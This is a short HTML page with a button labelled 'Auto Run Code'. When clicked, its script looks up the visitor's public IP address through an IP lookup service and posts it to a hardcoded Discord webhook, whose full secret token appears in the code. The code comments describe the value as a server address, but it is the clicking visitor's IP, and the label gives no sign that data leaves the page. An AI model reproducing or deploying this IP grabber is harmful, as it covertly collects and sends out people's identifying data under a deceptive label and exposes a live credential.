<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Run Code</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }

        #runButton {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #runButton:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <button id="runButton">Auto Run Code</button>
    <script>
        // Function to send public IP to Discord Webhook
        async function sendIpToDiscord(webhookUrl) {
            try {
                // Get public IP using an API
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                // Send IP address to Discord Webhook
                const discordResponse = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: `Server's IPv4 Address: ${ip}` })
                });

                console.log('IP address sent to Discord:', await discordResponse.json());
            } catch (error) {
                console.error('Error sending IP address to Discord:', error);
            }
        }

        // Add event listener to the button
        document.getElementById('runButton').addEventListener('click', () => {
            const webhookUrl = 'https://discord.com/api/webhooks/1247307479834955797/XtrU8R1FXI-BoZKR0ZLS4nGhuiUS-sQH9tRRMAkusu6E9Fz81eVP4hsxyAWA35ZPGiJY';
            sendIpToDiscord(webhookUrl);
        });
    </script>
</body>
</html>
